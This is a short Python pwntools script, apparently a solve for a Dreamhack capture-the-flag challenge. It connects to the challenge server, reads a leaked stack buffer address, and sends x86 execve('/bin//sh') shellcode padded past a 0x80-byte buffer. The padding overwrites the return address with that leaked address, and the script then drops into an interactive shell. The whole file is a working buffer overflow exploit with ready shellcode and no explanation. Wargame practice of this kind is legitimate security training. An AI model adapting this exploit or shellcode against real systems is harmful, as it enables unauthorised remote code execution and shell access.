from pwn import *

r = remote("host3.dreamhack.games", 14873)

shell = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'
r.recvuntil('buf = (')

buf = int(r.recv(10), 16)
r.recvuntil('\n')
payload = shell + b'a'*(0x80 - len(shell)) + b"AAAA" + p32(buf)

r.sendline(payload)
r.interactive()
